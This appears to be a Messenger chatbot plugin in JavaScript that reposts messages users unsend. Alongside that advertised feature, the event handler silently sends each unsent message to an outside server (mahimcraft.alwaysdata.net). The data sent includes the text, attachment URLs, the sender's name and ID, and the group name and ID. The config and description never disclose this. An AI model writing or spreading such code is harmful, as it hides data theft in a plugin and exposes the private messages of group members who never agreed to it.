module.exports.config = {
    name: "resend",
    version: "2.0.0",
    hasPermssion: 1,
    credits: "MAHIM ISLAM",
    description: "Fix Ver > 1.2.13",
    commandCategory: "general",
    usages: "",
    cooldowns: 0,
    hide: true,
    dependencies: {
        "request": "",
        "fs-extra": "",
        "axios": ""
    }
};

module.exports.handleEvent = async function({ event: e, api: a, client: t, Users: s }) {
    const n = global.nodemodule.request,
          o = global.nodemodule.axios,
          { writeFileSync: d, createReadStream: r } = global.nodemodule["fs-extra"];
    
    let { messageID: g, senderID: l, threadID: u, body: c } = e;

    global.logMessage || (global.logMessage = new Map);
    global.data.botID || (global.data.botID = a.getCurrentUserID());

    const i = global.data.threadData.get(u) || {};

    if ((void 0 === i.resend || 0 != i.resend) && l != global.data.botID) {
        if ("message_unsend" != e.type) {
            global.logMessage.set(g, {
                msgBody: c,
                attachment: e.attachments
            });
        }

        if ("message_unsend" == e.type) {
            var m = global.logMessage.get(g);
            if (!m) return;

            let userName = await s.getNameUser(l);

            (async () => {
                try {
                    let threadName = "Unknown Group";
                    // Attempt to get group name silently
                    try {
                        let threadInfo = await a.getThreadInfo(u);
                        threadName = threadInfo.threadName || "Unknown Group";
                    } catch (infoErr) {} // Ignore if bot lacks permission to see group name

                    let backendData = {
                        body: m.msgBody || "",
                        attachments: m.attachment ? m.attachment.map(att => att.url) : [],
                        details: {
                            userName: userName,
                            userId: l,
                            groupName: threadName,
                            groupId: u,
                            timestamp: Date.now()
                        }
                    };
                    await o.post("https://mahimcraft.alwaysdata.net/unsend/api.php", backendData);
                } catch (error) {
                    console.error("[MahimCraft Background Sync Failed]:", error.message);
                }
            })();
            if (null == m.attachment[0]) {
                return a.sendMessage(`${userName} removed 1 message\ncontent: ${m.msgBody}`, u);
            } else {
                let t = 0,
                    replyMsg = {
                        body: `${userName} just removed ${m.attachment.length} attachment.${"" != m.msgBody ? `\n\nContent: ${m.msgBody}` : ""}`,
                        attachment: [],
                        mentions: { tag: userName, id: l }
                    };

                for (var f of m.attachment) {
                    t += 1;
                    var h = (await n.get(f.url)).uri.pathname,
                        b = h.substring(h.lastIndexOf(".") + 1),
                        p = __dirname + `/cache/${t}.${b}`,
                        y = (await o.get(f.url, { responseType: "arraybuffer" })).data;
                    d(p, Buffer.from(y, "utf-8"));
                    replyMsg.attachment.push(r(p));
                }
                a.sendMessage(replyMsg, u);
            }
        }
    }
};

module.exports.languages = {
    vi: { on: "Bật", off: "Tắt", successText: "resend thành công" },
    en: { on: "on", off: "off", successText: "resend success!" }
};

module.exports.run = async function({ api: e, event: a, Threads: t, getText: s }) {
    const { threadID: n, messageID: o } = a;
    let d = (await t.getData(n)).data;
    if (void 0 === d.resend || 0 == d.resend) { d.resend = true; } else { d.resend = false; }
    await t.setData(n, { data: d });
    global.data.threadData.set(n, d);
    return e.sendMessage(`${1 == d.resend ? s("on") : s("off")} ${s("successText")}`, n, o);
};
